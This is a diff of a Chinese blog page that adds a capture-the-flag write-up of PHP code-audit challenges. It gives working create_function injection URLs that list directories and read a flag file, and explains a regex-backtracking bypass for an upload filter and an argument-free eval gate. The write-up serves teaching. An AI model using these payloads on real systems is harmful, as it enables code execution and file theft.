@@ -123,17 +123,26 @@
 
 
 
-<meta name="description" content="只会复现的菜鸡">
+<meta name="description" content="环境搭建注: 如果是在服务器搭建环境 记得开放所有端口或者相应端口在一个目录输入1git clone https://github.com/phith0n/code-breaking.git 然后进入一个题目目录，然后输入1docker-compose up -d 环境运行后，在docker-compose.yml中查看端口，访问即可 function端口808712$action = $_GE">
 <meta property="og:type" content="article">
 <meta property="og:title" content="p神代码审计知识星球二周年wp">
 <meta property="og:url" content="https://style-404.github.io/2019/03/24/p神代码审计知识星球二周年wp/index.html">
 <meta property="og:site_name" content="可乐&#39;blog">
-<meta property="og:description" content="只会复现的菜鸡">
+<meta property="og:description" content="环境搭建注: 如果是在服务器搭建环境 记得开放所有端口或者相应端口在一个目录输入1git clone https://github.com/phith0n/code-breaking.git 然后进入一个题目目录，然后输入1docker-compose up -d 环境运行后，在docker-compose.yml中查看端口，访问即可 function端口808712$action = $_GE">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-03-24T15:46:30.507Z">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1pud0uqipj30jg054gm5.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1pu9e3j9sj30ng08smxf.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qfng2to2j30zf0hgn2b.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qg8qk7saj30xi0fkace.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qgczt7smj30yb0a9757.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qgetyvmjj30xw086jrq.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qh5fwi9ij318q0g7762.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qhc3t99zj30tz09u3zu.jpg">
+<meta property="og:updated_time" content="2019-04-04T10:13:20.780Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="p神代码审计知识星球二周年wp">
-<meta name="twitter:description" content="只会复现的菜鸡">
+<meta name="twitter:description" content="环境搭建注: 如果是在服务器搭建环境 记得开放所有端口或者相应端口在一个目录输入1git clone https://github.com/phith0n/code-breaking.git 然后进入一个题目目录，然后输入1docker-compose up -d 环境运行后，在docker-compose.yml中查看端口，访问即可 function端口808712$action = $_GE">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1pud0uqipj30jg054gm5.jpg">
 
 
 
@@ -383,7 +392,38 @@
       
 
       
-        
+        <p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1pud0uqipj30jg054gm5.jpg" alt=""></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>注: 如果是在服务器搭建环境 记得开放所有端口或者相应端口<br>在一个目录输入<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/phith0n/code-breaking.git</span><br></pre></td></tr></table></figure></p>
+<p>然后进入一个题目目录，然后输入<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></table></figure></p>
+<p>环境运行后，在docker-compose.yml中查看端口，访问即可</p>
+<h1 id="function"><a href="#function" class="headerlink" title="function"></a>function</h1><p>端口8087<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1pu9e3j9sj30ng08smxf.jpg" alt=""><br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span><span class="comment">;</span></span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span></span><br></pre></td></tr></table></figure></p>
+<p>双问号为三元运算表达式<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">c</span> = a ?? b<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">表示如果a非空，则c = a，</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">如果a为空，则 c = b；</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">等价于</span><br><span class="line"></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span><span class="comment">;</span></span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<p>即输入两个参数，若输入，则取我们的输入，否则为空<br>然后是对<code>$_GET[&#39;action&#39;]</code>的正则表达式过滤<br>因为正则里用了^$，那么有没有可能在开头或结尾加入某个字符来绕过正则<br>一旦绕过正则，则可以进行危险函数构造<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qfng2to2j30zf0hgn2b.jpg" alt=""><br>%5c 是 <code>/</code><br>仅当使用%5c打头时，我们可以正常运行var_dump()，并且成功满足正则。<br>那么这是为什么呢？<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\在php中表示默认的命名空间,所有原生函数和类都在这个命名空间中</span><br><span class="line">普通调用一个函数，如果直接写函数名<span class="function"><span class="keyword">function</span><span class="title">_name</span>(<span class="params"></span>)调用，调用的时候其实相当于写了一个相对路径；</span></span><br><span class="line"><span class="function">而如果写\<span class="function"><span class="keyword">function</span><span class="title">_name</span>(<span class="params"></span>) 这样调用函数，则其实是写了一个绝对路径。</span></span></span><br><span class="line"><span class="function"><span class="function">如果你在其他<span class="title">namespace</span>里调用系统类，就必须写绝对路径这种写法</span></span></span><br></pre></td></tr></table></figure></p>
+<p>接下来需要找一个第二个参数可以引发危险的函数<br>string create_function ( string $args , string $code )<br>第一个参数控制函数的变量名，第二个参数控制函数内的代码<br>举例:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">create_function</span><span class="params">(<span class="string">'$fname'</span>,<span class="string">'echo $fname."可乐"'</span>)</span></span></span><br></pre></td></tr></table></figure></p>
+<p>等价于<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">类似于：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">(<span class="keyword">$fn</span>ame)</span> &#123;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="keyword">$fn</span>ame.<span class="string">"可乐"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>接下来利用create_function() 注入<br>$arg = return “2333”;}phpinfo();/*<br>相当于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a,$b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"2333"</span>;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();</span><br><span class="line"><span class="comment">/*&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qg8qk7saj30xi0fkace.jpg" alt=""><br>虽然create_function()已经移除了 但是还是会继续执行下面的phpinfo()</p>
+<p>接下里进行读取目录<br>将phpinfo替换为print_r(scandir(‘../‘));即可<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?action=%5ccreate_function&amp;arg=<span class="keyword">return</span>%20<span class="string">"2333"</span>;&#125;print_r(scandir(%27../%27));<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qgczt7smj30yb0a9757.jpg" alt=""><br>接下来读取文件内容<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=%5ccreate_function&amp;arg=<span class="keyword">return</span>%20<span class="string">"2333"</span>;&#125;print_r(file_get_contents(%27../flag_h0w2execute_arb1trary_c0de%27));<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qgetyvmjj30xw086jrq.jpg" alt=""><br>得到flag</p>
+<h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><p>端口:8088<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (is_php($data)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    @mkdir($user_dir, <span class="number">0755</span>);</span></span><br><span class="line"><span class="php">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>通过is_php()正则来检查$data的内容:即:<br>&lt;后面不能有问号，&lt;?后面不能有(;?&gt;反引号<br>题目并没有禁止我们上传php文件，但是对文件内容进行了过滤，禁止我们写入php代码。接下来就是绕过正则<br>在php7 中<br>tags都已经被移除 所以无法使用<br>&lt;%= phpinfo();<br>或者</p>
+<p><script language="php">phpinfo();</script><br>接下来要利用 <strong>php正则回溯法</strong><br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>
+<p>涉及到正则匹配的流程，正则匹配有两种引擎<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">DFA:</span> 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</span><br><span class="line">NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</span><br></pre></td></tr></table></figure></p>
+<p>php的PCRE库使用的就是NFA的正则引擎，就会涉及到回溯的一个过程。<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qh5fwi9ij318q0g7762.jpg" alt=""><br>一开始 <code>.*</code>会将后面的全部字符匹配到，然后为了匹配<code>[(`;?&gt;]</code><br>然后就会一个字符一个字符的回溯，直到匹配到最后的; ，才会进行下一个<code>.*</code>的匹配</p>
+<p>PHP为了防止正则表达式的拒绝服务攻击（回溯次数过多），限制了回溯的次数</p>
+<p>在php5.2及之前这个次数为100000，之后一直到如今的7.2都是1000000<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qhc3t99zj30tz09u3zu.jpg" alt=""><br>那么如果超过100万次会返回失败  即匹配失败<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(<span class="name">preg_match</span>('/&lt;\?.*[(`;?&gt;].*/is', '&lt;?php phpinfo()<span class="comment">;//'.str_repeat('a', 1000000)));</span></span><br><span class="line">bool(<span class="name">false</span>)</span><br></pre></td></tr></table></figure></p>
+<h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>端口:82</p>
+<h1 id="phplimit"><a href="#phplimit" class="headerlink" title="phplimit"></a>phplimit</h1><p>端口:8084<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>代码会将<code>$_GET[&#39;code&#39;]</code>中满足正则<code>/[^\W]+\((?R)?\)/</code>的部分，替换为空，然后查看是否剩下的部分强等于;<br>如果满足，则执行<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>($_GET[<span class="string">'code'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
+<p>否则什么都不做。<br>首先是[^\W]<br>对于\W,其意思等价于[^A-Za-z0-9_]。<br>那么我们知道，我们的input必须以此开头<br>然后是括号匹配</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\( ...... \)</span><br></pre></td></tr></table></figure>
+<p>括号中间为<br>(?R)?<br>意思为重复整个模式<br>简单理解，我们可以输入以下类型</p>
+<p>a(b(c()))<br>但我们不能加参数,否则将无法匹配</p>
+<p>a(c,d)<br>所以正则看完，题目的意思非常明确了：<br>我们只能input函数，但函数中不能使用参数，否则判断句右边经过替换，将不止剩余分号;</p>
+<p>那么有没有办法通过无参数函数，达到RCE的目的呢？答案显然是不可能的，没有参数，怎么传递我们需要执行的指令呢？</p>
+
       
     </div>
     
@@ -500,8 +540,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -518,7 +567,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-count">38</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -577,6 +626,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#function"><span class="nav-number">2.</span> <span class="nav-text">function</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-pcrewaf"><span class="nav-number">3.</span> <span class="nav-text">easy - pcrewaf</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#phpmagic"><span class="nav-number">4.</span> <span class="nav-text">phpmagic</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#phplimit"><span class="nav-number">5.</span> <span class="nav-text">phplimit</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
